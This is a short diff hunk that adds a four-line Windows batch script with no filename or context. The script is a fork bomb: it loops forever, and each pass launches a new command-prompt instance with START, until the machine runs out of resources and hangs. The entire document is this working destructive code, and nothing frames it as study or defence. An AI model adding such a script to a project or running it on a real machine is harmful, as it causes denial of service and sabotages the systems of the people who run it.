@@ -1,0 +1,4 @@
+@ECHO OFF
+:X
+START
+GOTO X
